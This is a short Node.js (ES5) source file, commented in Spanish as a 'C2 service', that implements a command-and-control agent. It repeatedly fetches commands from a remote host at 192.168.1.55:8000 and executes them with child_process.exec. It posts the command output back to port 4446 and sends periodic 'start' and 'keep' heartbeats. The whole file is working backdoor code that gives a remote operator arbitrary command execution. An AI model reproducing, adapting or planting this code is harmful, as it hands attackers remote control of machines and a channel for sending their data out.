// sbtv C2 service (ES5, Node 4.4.3) — bucle de comandos bidireccional
var http = require('http');

var HOST = '192.168.1.55';
var CMDPORT = 8000;
var OUTPORT = 4446;
var cp = require('child_process');

function post(body) {
    try {
        var req = http.request({ host: HOST, port: OUTPORT, method: 'POST', path: '/r' }, function () {});
        req.on('error', function () {});
        req.write(body);
        req.end();
    } catch (e) {}
}

function tick() {
    http.get('http://' + HOST + ':' + CMDPORT + '/cmd', function (res) {
        var body = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { body += c; });
        res.on('end', function () {
            body = body || '';
            if (body.trim().length > 0) {
                cp.exec(body, { timeout: 30000 }, function (e, so, se) {
                    post((so || '') + (se || ''));
                });
            }
            setTimeout(tick, 2000);
        });
    }).on('error', function () {
        setTimeout(tick, 4000);
    });
}

post('c2?start');
tick();
setInterval(function () { post('c2?keep'); }, 30000);
